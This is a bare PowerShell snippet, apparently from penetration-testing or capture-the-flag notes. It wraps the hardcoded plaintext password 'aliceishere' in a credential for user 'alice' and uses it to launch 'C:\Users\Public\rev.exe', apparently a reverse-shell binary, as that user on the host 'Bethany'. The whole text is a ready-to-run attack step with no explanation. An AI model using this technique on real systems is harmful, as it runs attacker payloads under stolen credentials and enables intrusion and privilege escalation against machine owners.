$secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force

$mycreds = New-Object System.Management.Automation.PSCredential ("alice", $secpasswd)

$computer = "Bethany"

[System.Diagnostics.Process]::Start("C:\Users\Public\rev.exe", "", $mycreds.Username, $mycreds.Password, $computer)
